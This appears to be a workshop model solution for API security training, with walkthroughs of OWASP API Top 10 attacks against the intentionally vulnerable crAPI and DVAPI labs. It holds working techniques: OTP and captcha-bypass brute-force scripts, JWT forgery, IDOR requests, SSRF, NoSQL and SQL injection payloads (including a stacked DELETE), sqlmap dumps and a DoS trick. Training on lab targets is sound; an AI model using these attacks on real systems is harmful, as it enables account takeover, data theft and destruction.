# Museterlösung Workshop API-Security

# API9: Unsachgemäße Asset-Verwaltung

### Demo: Gobuster

```bash
# find api/shop/security
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://localhost:8888/workshop/api/shop/
```

### Hands-On: crAPI

```bash
# find community/paypal
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://localhost:8888/community/
```



### Hands-On: DVAPI #9

```bash
POST /api/allChallenges HTTP/1.1
Host: dvapi.local:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dvapi.local:3000/challenges
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NjRkZGFmMmFmY2M2NzMyMDA4MmIyOTEiLCJ1c2VybmFtZSI6ImFzZGZAMmNvbnN1bHQuY2giLCJpc0FkbWluIjoiZmFsc2UiLCJpYXQiOjE3MTYzNzgzNjh9.6lk5WDdKNDsvvTEsTT5TQRWTK93OuIHxWsjo4JgNf88
Content-Length: 16
Origin: http://dvapi.local:3000
Connection: close
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NjRkZGFmMmFmY2M2NzMyMDA4MmIyOTEiLCJ1c2VybmFtZSI6ImFzZGZAMmNvbnN1bHQuY2giLCJpc0FkbWluIjoiZmFsc2UiLCJpYXQiOjE3MTYzNzgzNjh9.6lk5WDdKNDsvvTEsTT5TQRWTK93OuIHxWsjo4JgNf88

{
  "unreleased": 1
}
```



---



# API2: Fehler in Authentifizierung

### Demo: crAPI#3

Reset the password of a different user

1. Request a password reset for your own user and inspect the requests

```json
POST /identity/api/auth/forget-password

{
  "email": "example@test.com"
}


POST /identity/api/auth/v3/check-otp
{
  "email": "example@test.com",
  "otp": "9521",
  "password": "Asdf123!"
}
```

2. Find another user's email (Community tab besides Shop)

```json
GET /community/api/v2/community/posts/recent?limit=30&offset=0
...
{
  "id": "C8LoyWLzPi3APEcoPSRvQJ",
  "title": "Title 1",
  "content": "Hello world 1",
  "author": {
    "nickname": "Adam",
    "email": "adam007@example.com",
    "vehicleid": "f89b5f21-7829-45cb-a650-299a61090378",
    "profile_pic_url": "",
    "created_at": "2024-06-05T07:32:48.692Z"
  },
  "comments": [],
  "authorid": 1,
  "CreatedAt": "2024-06-05T07:32:48.692Z"
}
...
```

3. Request password reset for another user

4. Brute-force OTP against OTP endpoint (brute-force.py)

```python
import requests

email = 'adam007@example.com'
url = 'http://crapi.local:8888/identity/api/auth/v3/check-otp'
headers = {'Content-Type':'application/json'}

for otp in range(1000, 9999):
    body = {'email':email, 'otp':otp, 'password':'Asdf123!'}
    x = requests.post(url, headers=headers, json=body)
    print(otp, x.text)
```

Script execution:

```bash
$ python3 brute-force.py | grep -i ":200"
1000 {"message":"Invalid OTP! Please try again..","status":500}
1001 {"message":"Invalid OTP! Please try again..","status":500}
1002 {"message":"Invalid OTP! Please try again..","status":500}
1003 {"message":"Invalid OTP! Please try again..","status":500}
1004 {"message":"Invalid OTP! Please try again..","status":500}
1005 {"message":"Invalid OTP! Please try again..","status":500}
1006 {"message":"Invalid OTP! Please try again..","status":500}
1007 {"message":"Invalid OTP! Please try again..","status":500}
1008 {"message":"Invalid OTP! Please try again..","status":500}
1009 {"message":"You've exceeded the number of attempts.","status":503}
1010 {"message":"ERROR..","status":500}
1011 {"message":"ERROR..","status":500}
```

5. Note that OTP endpoint contains the string "v3" instead of "v2" as all the others. Request a new password reset for the other user and run the Python script against the v2 endpoint instead of the v3 endpoint.

```python
import requests

email = 'adam007@example.com'
url = 'http://crapi.local:8888/identity/api/auth/v2/check-otp'
headers = {'Content-Type':'application/json'}

for otp in range(1000, 9999):
    body = {'email':email, 'otp':otp, 'password':'Asdf123!'}
    x = requests.post(url, headers=headers, json=body)
    print(otp, x.text)
```

Script execution:

```bash
$ python3 brute-force.py
1000 {"message":"Invalid OTP! Please try again..","status":500}
1001 {"message":"Invalid OTP! Please try again..","status":500}
1002 {"message":"Invalid OTP! Please try again..","status":500}
1003 {"message":"Invalid OTP! Please try again..","status":500}
1004 {"message":"Invalid OTP! Please try again..","status":500}
1005 {"message":"Invalid OTP! Please try again..","status":500}
1006 {"message":"Invalid OTP! Please try again..","status":500}
1007 {"message":"Invalid OTP! Please try again..","status":500}
1008 {"message":"Invalid OTP! Please try again..","status":500}
...
2028 {"message":"OTP verified","status":200}


```

### Demo: crAPI#15:

Find a way to forge valid JWT Tokens:

JWT Algorithm Confusion Vulnerability

- crAPI uses RS256 JWT Algorithm by default

- Public Key to verify JWT is available at http://localhost:8888/.well-known/jwks.json

- Convert the public key to base64 encoded form and use it as a secret to create a JWT in HS256 Algorithm

- This JWT will be accepted as a valid JWT Token by crAPI
1. Download the public key information and define a token variable using a valid JWT

```bash
$ wget http://localhost:8888/.well-known/jwks.json
$ token=eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOi[...]
```

2. Verify if the downloaded public key can be used to verify the signature of the JWT:

```bash
$ jwt_tool $token -V -jw jwks.json
[...]

Found RSA key factors, generating a public key                                                                                                   
[+] kid_MKMZkDenUfuDF2byYowDj7tW5Ox6XG4Y1THTEGScRg8_1717589421.pem

Attempting to verify token using kid_MKMZkDenUfuDF2byYowDj7tW5Ox6XG4Y1THTEGScRg8_1717589421.pem                                                  
RSA Signature is VALID
```

3. Use the base64-encoded key from the gnerated PEM file as a secret to forge a new JWT (without linebreaks!) and forge a new JWT with alg "HS256" using jwt_tool. Change the "alg" header and leave the rest as is

```bash
$ secret=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsZKrGYja9S7BkO+waOcupoGY6BQjixJkg1Uitt278NbiCSnBRw5/cmfuWFFFPgRxabBZBJwJAujnQrlgTLXnRRItM9SRO884cEXn+s4Uc8qwk6pev63qb8no6aCVY0dFpthEGtOP+3KIJ2kx2i5HNzm8d7fG3ZswZrttDVbSSTy8UjPTOr4xVw1Yyh/GzGK9i/RYBWHftDsVfKrHcgGn1F/T6W0cgcnh4KFmbyOQ7dUy8Uc6Gu8JHeHJVt2vGcn50EDtUy2YN+UnZPjCSC7vYOfd5teUR/Bf4jg8GN6UnLbr/Et8HUnz9RFBLkPIf0NiY6iRjp9ooSDkml2OGql3wwIDAQAB
$ jwt_tool $token -T -S hs256 -p $secret
[...]
====================================================================                                    
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] alg = "RS256"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of alg is: RS256
Please enter new value and hit ENTER
> HS256
[1] alg = "HS256"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
[...]

jwttool_822ef385636c63c26e0f37eec8d7fbad - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhc[...]
```

4. Use the forged token and verify that crAPI is indeed considering it a valid token, e.g. by calling the shop endoint.

### Hands-on: crAPI #14

Find an endpoint that does not perform authentication checks for a user.

Affected request:

```bash
GET /workshop/api/shop/orders/6 HTTP/1.1
Host: crapi.local:8888
Content-Type: application/json
Connection: close
```

Server response:

```json
HTTP/1.1 200 OK
Server: openresty/1.25.3.1
Date: Wed, 05 Jun 2024 12:19:08 GMT
Content-Type: application/json
Connection: close
Allow: GET, POST, PUT, HEAD, OPTIONS
Vary: origin, Cookie
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Content-Length: 544

{
  "order": {
    "id": 6,
    "user": {
      "email": "example@test.com",
      "number": "0123456789"
    },
    "product": {
      "id": 2,
      "name": "Wheel",
      "price": "10.00",
      "image_url": "images/wheel.svg"
    },
    "quantity": 1,
    "status": "delivered",
    "transaction_id": "5817b872-692d-4d6d-902e-708839b89a40",
    "created_on": "2024-06-05T12:18:57.585499"
  },
  "payment": {
    "transaction_id": "5817b872-692d-4d6d-902e-708839b89a40",
    "order_id": 6,
    "amount": 10,
    "paid_on": "2024-06-05T12:18:57.585499",
    "card_number": "XXXXXXXXXXXX7259",
    "card_owner_name": "Asdf Qwer",
    "card_type": "Visa",
    "card_expiry": "01/2029",
    "currency": "USD"
  }
}
```
This allows us to leak orders of other users!

### Hands-on: crAPI #15: Invalid Signature Vulnerability

Access information of another user

1. Note that the Dashboard endpoint does not verify the signature of the authorization token by repeating a request to it with manipulated signature (simple remove a character)

Vulenrable endpoint:

```bash
GET /identity/api/v2/user/dashboard HTTP/1.1
Host: crapi.local:8888
Content-Type: application/json
Authorization: Bearer [JWT with manipulated signature]
Connection: close
```

2. Manipulate the payload (middle part of the JWT) by decoding it, changing the "sub" parameter to the email address of another user, and base64-encoding the results (remove trailing "=")

3. Issue the dashboard request with the manipulated token to obtain information from that other user.

### Hands-on: DVAPI#2

Admin has a challenge for you. Admin says anyone who can log in with their account will get some surprise. Can you find out the surprise?

1. Define the "token" variable as a valid JWT token and run a crack attempt with the jwt_tool against it using a wordlist that contains the string "secret123"

```bash
$ token=eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOi[...]
$ jwt_tool $token -C -d /usr/share/wordlists/fasttrack.txt
[...]
[+] secret123 is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "secret123"
```

2. Forge a JWT token using the secret where "isAdmin" of the payload (middle part) is set to the string "true"

```bash
$ jwt_tool $token -T -S hs256 -p "secret123"
[...]
====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] alg = "HS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] userId = "66605dc46b29b31e20123cd8"
[2] username = "asdf"
[3] isAdmin = "false"
[4] iat = 1717591497    ==> TIMESTAMP = 2024-06-05 08:44:57 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3

Current value of isAdmin is: false
Please enter new value and hit ENTER
> "true"
[1] userId = "66605dc46b29b31e20123cd8"
[2] username = "asdf"
[3] isAdmin = "true"
[4] iat = 1717591497    ==> TIMESTAMP = 2024-06-05 08:44:57 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number
(or 0 to Continue)
> 0
jwttool_5277ae5ac5d90b91f9b39d9d6c38eae9 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NjY[...]
```

3. Call the profile endpoint using the forged JWT to obtain the flag.

```bash
GET /api/profile
```

---

# API1: Fehler in Objekt-Autorisierung

### Demo: crAPI#1

Access details of other users vehicles.

1. Login to the application fromhttp://localhost:8888/login

2. From the *Dashboard*, choose *Add a Vehicle* and add the vehicle by providing the VIN and pincode received in Mailhog mailbox after Signup or by re initiating from *Dashboard* page.

3. After the vehicle details are verified successful, the vehicle will get added and then be populated in the *Dashboard* page.

4. Observe the request sent when we click *Refresh Location*. It can be seen that the endpoint is in the format `/identity/api/v2/vehicle/<vehicleid>/location`.

5. Sensitive information like latitude and longitude are provided back in the response for the endpoint. Send the request to *Repeater* for later purpose.

6. Click *Community* in the navbar tovisit http://localhost:8888/forum

7. It can be observed that the forum posts are populated based on the response from `/community/api/v2/community/posts/recent`endpoint. On further analysing the response, it can be seen that `vehicleid` is also received back corresponding to the author of each post.

8. Edit the vehicleid in the request sent to *Repeater* in Step 5 with the `vehicleid`received from endpoint `/community/api/v2/community/posts/recent`.

9. Upon sending the request, sensitive details like latitude, longitude and full name are received in the response.
   
   

### Hands-On: crAPI #2

Access mechanic reports of other users:

1. Login to the application from http://localhost:8888/login

2. After adding a vehicle, we will have an option to send service request to mechanic by using the *Contact Mechanic* option.

3. Observe the request sent after the *Send Service Request*. In the response of `/workshop/api/merchant/contact_mechanic`, we will be able to find the hidden API endpoint in `report_link`.

4. Go to the link present as value in `report_link`.

5. Change the value of report_id in the request and send it to access mechanic reports of other users.
   
   

### Hands-On: DVAPI #1

```bash
GET /api/getNote?username=admin HTTP/1.1
Host: dvapi.local:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dvapi.local:3000/profile
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NjRkZGFmMmFmY2M2NzMyMDA4MmIyOTEiLCJ1c2VybmFtZSI6ImFzZGZAMmNvbnN1bHQuY2giLCJpc0FkbWluIjoiZmFsc2UiLCJpYXQiOjE3MTYzNzgzNjh9.6lk5WDdKNDsvvTEsTT5TQRWTK93OuIHxWsjo4JgNf88
Connection: close
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NjRkZGFmMmFmY2M2NzMyMDA4MmIyOTEiLCJ1c2VybmFtZSI6ImFzZGZAMmNvbnN1bHQuY2giLCJpc0FkbWluIjoiZmFsc2UiLCJpYXQiOjE3MTYzNzgzNjh9.6lk5WDdKNDsvvTEsTT5TQRWTK93OuIHxWsjo4JgNf88

```



---

# API5: Fehler in Funktions-Autorisierung

### Demo: crAPI #7

Delete the video of another user.

1. Click on the avatar to visit your profile, upload a video, and change its name.

2. We are interested in the PUT request:

```json
PUT /identity/api/v2/user/videos/6 HTTP/1.1
Host: crapi.local:8888
Content-Type: application/json
Authorization: Bearer [JWT]
Content-Length: 20
Connection: close

{
  "videoName": "myCustomName"
}
```

3. Determine supported methods by issuing an OPTIONS request to that endpoint. Just change the HTTP method in Burp's repeater to do so.

Response header:

```bash
Allow: GET,HEAD,PUT,DELETE,OPTIONS
```

4. Issueing a DELETE request to the endpoint yields the following server response (HTTP/1.1 404)

```json
{
  "message": "This is an admin function. Try to access the admin API",
  "status": 403
}
```

5. In the request path, change "user" to "admin" to delete your own video:

Request:

```bash
DELETE /identity/api/v2/admin/videos/6 HTTP/1.1
Host: crapi.local:8888
Content-Type: application/json
Authorization: Bearer [JWT]
Content-Length: 0
Connection: close
```

Server response body:

```json
{
  "message": "User video deleted successfully.",
  "status": 200
}
```

6. Modifying the video id at the end of the path to a bigger one yields a 404 response, changing it to a smaller one results in a success message. Consequently, this allows us to delete the videos of other users.

### Hands-on: DVAPI #5

DVAPI has many users. You can see other's profile and others can see yours. What could go wrong here? Right? Right???

1. An OPTIONS request to the GET user endpoint reveals that the DELETE method is supported:

```bash
OPTIONS /api/user/Charlie HTTP/1.1
Host: dvapi.local:3000
Connection: close
```

Server response:

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Allow: GET,HEAD,DELETE
Content-Type: text/html; charset=utf-8
Content-Length: 15
ETag: W/"f-vwvPzyVoI/ffOSHTCooZCn+JbCg"
Date: Wed, 05 Jun 2024 13:15:17 GMT
Connection: close

GET,HEAD,DELETE
```

2. Issue a DELETE request to delete another user and receive the flag:

```bash
DELETE /api/user/Charlie HTTP/1.1
Host: dvapi.local:3000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NjRkZGFmMmFmY2M2NzMyMDA4MmIyOTEiLCJ1c2VybmFtZSI6ImFzZGZAMmNvbnN1bHQuY2giLCJpc0FkbWluIjoiZmFsc2UiLCJpYXQiOjE3MTYzNzgzNjh9.6lk5WDdKNDsvvTEsTT5TQRWTK93OuIHxWsjo4JgNf88
Connection: close
```

---

# API3: Fehler in Objekteigenschaft-Autorisierung

### Demo:   crAPI #4

 Find an API endpoint that leaks sensitive information of other users

1. Click on "Community"

2. Go to details about a post

3. Insepct the response in Burp -> This gives details about users

### Demo: crAPI #9

Increase your balance by $1,000 or more.

1. Login to the application from http://localhost:8888/login

2. Click *Shop* in the navbar to visit http://localhost:8888/shop

3. There is an initial available balance of \$100. Try to order the *Seat* item for \$10 from the shop by using the *Buy* button and observe the request sent.

4. On observing the POST request `/workshop/api/shop/orders`, it can be observed that `credit` has been reduced by \$10 and the current available balance is \$90.

5. With this knowledge, we can try to send the captured POST request `/workshop/api/shop/orders` to *Repeater*.

6. Try to change the value of `quantity` in the request body to a negative value and send the request. It can be observed that the available balance has now increased and the order has been placed.

7. Inorder to increase the balance by \$1000 or more, provide an appropriate value in the ‘quantity’ (ie: -100 or less) and send the request. It can be observed that the available balance has now increased by \$1000 or more.
   
   

### Hands-On: DVAPI #3

```
POST /api/register HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:3000/register
Content-Type: application/json
Content-Length: 61
Origin: http://localhost:3000
Connection: close
Cookie: security=impossible; PHPSESSID=31bab6bb14f69d4bce25223caca0e672
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{
"username":"kali",
"password":"kali",
"score": 9999999
}
```

After this user is registered, login and load the scoreboard. The flag is included in the API Response but not shown in the Frontend.



---

# API4: Uneingeschränkter Ressourcenbezug

### Demo: crAPI #6

Perform a layer 7 DoS using ‘contact mechanic’ feature

1. Contact a mechanic from the dashboard (a vehicle has to be imported):

```json
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Host: crapi.local:8888
Content-Type: application/json
Authorization: Bearer [JWT]
Content-Length: 212
Connection: close

{
  "mechanic_code": "TRAC_JHN",
  "problem_details": "asdf",
  "vin": "3RCSW48QGTX996907",
  "mechanic_api": "http://crapi.local:8888/workshop/api/mechanic/receive_report",
  "repeat_request_if_failed": false,
  "number_of_repeats": 1
}
```

2. Change the parameters "repeat_request_if_failed" to "true" and "number_of_repeats" to a value > 100 to cause the layer 7 DoS.

```json
{
  "message": "Service unavailable. Seems like you caused layer 7 DoS :)"
}
```

### Hands-on DVAPI #4

Do you know that you can customize your profile? Try it out and make your profile stand out among others.

1. Visit your profile (Avatar -> Account). You can upload a picture there. If the size of the picture is not limited, we could fill up a lot of the storage of the server

2. Create a file with an image extension larger than 50 MB:

```bash
$ fallocate -l 55M test.png
```

3. Upload the file to receive the flag.

---

# API7: Server-Side Request Forgery (SSRF)

### Demo: crAPI #11

HTTP Request to an internal server possible? Hint: User `http://nginx`

1. Click on "Contact Mechanic"

2. Create a request

3. Check the POST request and find the"mechanic_api"and in the response, notice the parameter `response_from_mechanic_api``

4. Modify the mechanic_api -> errors

5. Change it to “http://nginx“. This connects to the nginx service within the docker network.
   
   

### Hands-On: DVAPI #7

The internal application has an open port: `http://localhost:42`

```
POST /api/addNoteWithLink HTTP/1.1
Host: dvapi.local:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dvapi.local:3000/profile
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NjRkZGFmMmFmY2M2NzMyMDA4MmIyOTEiLCJ1c2VybmFtZSI6ImFzZGZAMmNvbnN1bHQuY2giLCJpc0FkbWluIjoiZmFsc2UiLCJpYXQiOjE3MTYzNzgzNjh9.6lk5WDdKNDsvvTEsTT5TQRWTK93OuIHxWsjo4JgNf88
Content-Length: 31
Origin: http://dvapi.local:3000
Connection: close
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NjRkZGFmMmFmY2M2NzMyMDA4MmIyOTEiLCJ1c2VybmFtZSI6ImFzZGZAMmNvbnN1bHQuY2giLCJpc0FkbWluIjoiZmFsc2UiLCJpYXQiOjE3MTYzNzgzNjh9.6lk5WDdKNDsvvTEsTT5TQRWTK93OuIHxWsjo4JgNf88

{"url":"http://localhost:42"}
```



---

# API8: Sicherheitsrelevante Fehlkonfigurationen

### Hands-on: DVAPI #8

The Developers at DVAPI are lazy which has led to a misconfigured system. Find the misconfiguration and submit the flag !!!

1. Submit a request with a JWT where the signature has been manipulated (e.g. remove one character) to receive a stacktrace (revealing sensitive information) and the flag.

# API6: Uneingschränkter Zugriff auf sensible Geschäftsprozesse

### Demo: None

### Hands-On: DVAPI #6

Create a single ticket:

```bash
POST /api/addTicket HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:3000/challenges
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NjU3MzNjMzM0Mzg5MWE5ZTdlM2E3NDkiLCJ1c2VybmFtZSI6ImthbGkiLCJpc0FkbWluIjoiZmFsc2UiLCJpYXQiOjE3MTY5OTA5MTh9.CTHXA4EyQfsW6sIDgpj7HbdkqGtrLUyxWdbkupISboo
Content-Length: 18
Origin: http://localhost:3000
Connection: keep-alive
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NjU3MzNjMzM0Mzg5MWE5ZTdlM2E3NDkiLCJ1c2VybmFtZSI6ImthbGkiLCJpc0FkbWluIjoiZmFsc2UiLCJpYXQiOjE3MTY5OTA5MTh9.CTHXA4EyQfsW6sIDgpj7HbdkqGtrLUyxWdbkupISboo
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"message":"test"}
```

To obtain a flag, create 150 tickets.

### Hands-On: Captcha-Bypassing

The following code is a solution for lab1. In order to solve lab2, you need to create a custom userlist and wordlist with common credentials. This allows you to brute-force the login even though it its secured by a captcha.

```python
#!/usr/bin/python3

import requests, time, os, re, signal, pytesseract, colorama, sys
from colorama import Fore
from PIL import Image

def def_handler(sig, frame):
    print("\n\n[!] Exiting...")
    sys.exit(1)

def GetCaptcha(base_url):
    loop = 0
    while loop == 0:
        try:
            # Create a session for multiple requests
            s = requests.session()

            print(Fore.MAGENTA + "[*]" + Fore.WHITE + " Obtaining captcha image url...")
            response = s.get(base_url) # Send request
            captcha_expression = re.search(r'\d{5,10}', response.text) # Use regex to filter for captcha rand url number
            image_url = base_url.removesuffix("lab1.php") + "captcha.php?rand=" + captcha_expression.group(0) # Build captcha image url

            print(Fore.GREEN + "[+]" + Fore.WHITE + " Image url: " + image_url)
            captcha_image = s.get(image_url) # Send request to image

            # Save captcha image in a file
            f = open("captcha.jpg", "wb")
            f.write(captcha_image.content)
            f.close()
            time.sleep(0.2)

            print(Fore.MAGENTA + "[*]" + Fore.WHITE + " Converting captcha image to text...")
            # Use pytesseract to parse image
            captcha_value = pytesseract.image_to_string(Image.open('captcha.jpg')).strip()
            os.remove("captcha.jpg")

            print(Fore.GREEN + "[+]" + Fore.WHITE + " Captcha value: %s" % captcha_value)
            time.sleep(0.2)

            print(Fore.MAGENTA + "[*]" + Fore.WHITE + " Checking if captcha is valid...")
            post_data = {
                'captcha': '%s' % (captcha_value),
                'submit': 'Submit'
            }

            r2 = s.post(base_url, data=post_data)

            if "captcha code is correct" in r2.text:
                print(Fore.GREEN + "\n[+]" + Fore.WHITE + " Captcha entered succesfully")
                loop = 1
            else:
                print(Fore.RED + "\n[-]" + Fore.WHITE + " Captcha entered incorrectly\n")
        except Exception as e:
            print(e)
            sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        base_url = sys.argv[1]
        GetCaptcha(base_url)
    else:
        print("Usage: python3 solution1.py http://127.0.0.1/lab1.php")
        sys.exit(0)
```



---



# API10: Unsichere Nutzung von APIs

### Demo: crAPI #12

Find a way to get free coupons without knowing the coupon code.

1. Enter the "Shop" and try to add a coupon using an arbitrary string to get the request into the Burp history.

2. The endpoint for coupon validation is vulnerable to NoSQL injection:

```json
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: crapi.local:8888
Content-Type: application/json
Authorization: Bearer [JWT]
Content-Length: 25
Connection: close

{
  "coupon_code": {
    "$ne": 1
  }
}
```

Server response body:

```json
{
  "coupon_code": "TRAC075",
  "amount": "75",
  "CreatedAt": "2024-06-05T07:32:48.634Z"
}
```

3. You can now use that coupon code. You can also leak an other coupon:

```json
{
    "coupon_code":{
        "$ne": "TRAC075"
    }
}
```



### Hands-on: DVAPI #10

API's used at the Authentication of the application does not look safe, can you test it and get the flag ??

1. The login is vulnerable to NoSQL injection. Issue the following request to receive the flag in kali:

```json
POST /api/login HTTP/1.1
Host: dvapi.local:3000
Content-Type: application/json
Content-Length: 56
Connection: close

{
  "username": "admin",
  "password": {
    "$ne": "wrong-password"
  }
}
```

### Hands-on: crAPI #13

Find a way to redeem a coupon that you have already claimed by modifying the database

1. We are interested in the following request:

```json
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: crapi.local:8888
Content-Type: application/json
Authorization: Bearer [JWT]
Content-Length: 41
Connection: close

{
  "coupon_code": "TRAC075",
  "amount": 75
}
```

2. Trying common SQL injections strings like "1' or '1' = '1" for the "coupon_code" parameter, we see that it seems to be vulnerable. A single "'" (apostrophe) results in a server error, too.

3. We try stacking semicolon-separated SQL queries to read the version of the SQL server:

```json
{
  "coupon_code": "1'; select version() --",
  "amount": 75
}
```

Server response:

```json
{
  "message": "PostgreSQL 14.12 (Debian 14.12-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit Coupon code is already claimed by you!! Please try with another coupon code"
}
```

4. Save the request with the valid coupon code to a file from Burp. This can be achieved by right-clicking on the request and select "copy to file" from the menu.

5. Run sqlmap against the request (use the default answer on all questions):

```bash
$ sqlmap -r sql_injection.txt
[...]
[10:13:24] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON coupon_code' might not be injectable
[...]
[10:13:27] [INFO] (custom) POST parameter 'JSON coupon_code' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[10:13:30] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'PostgreSQL'
[...]
[10:13:54] [INFO] (custom) POST parameter 'JSON coupon_code' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable
[10:13:54] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:14:04] [INFO] (custom) POST parameter 'JSON coupon_code' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable
[...]
```

6. Enumerate the PostgreSQL database:

```bash
# list databases
$ sqlmap -r ./sql_injection.txt -p coupon_code --batch --dbs
[...]
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
[...]

# list tables of the database 'public'
$ sqlmap -r ./sql_injection.txt -p coupon_code --batch -D public --tables
[...]
Database: public
[25 tables]
+----------------------------+
| order                      |
| applied_coupon             |
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
| health_check_db_testmodel  |
| mechanic                   |
| otp                        |
| otp_token                  |
| product                    |
| profile_video              |
| service_request            |
| user_details               |
| user_login                 |
| vehicle_company            |
| vehicle_details            |
| vehicle_location           |
| vehicle_model              |
+----------------------------+
[...]

# dump contents of table 'applied_coupon' from the database 'public'
$ sqlmap -r ./sql_injection.txt -p coupon_code --batch -D public -T applied_coupon --dump
[...]
Database: public
Table: applied_coupon
[1 entry]
+----+---------+-------------+
| id | user_id | coupon_code |
+----+---------+-------------+
| 1  | 8       | TRAC075     |
+----+---------+-------------+
[...]
```

7. Since PostgreSQL allows stacked queries, we can attempt to delete the entry we found in the table "applied_coupon" that prevents us from redeeming the code another time. We do this back in Burp Repeater:

```json
{
  "coupon_code": "1'; DELETE FROM applied_coupon WHERE user_id=8; SELECT version(); --",
  "amount": 75
}
```

8. Finally, verify that this worked by redeeming the code "TRAC075" again.
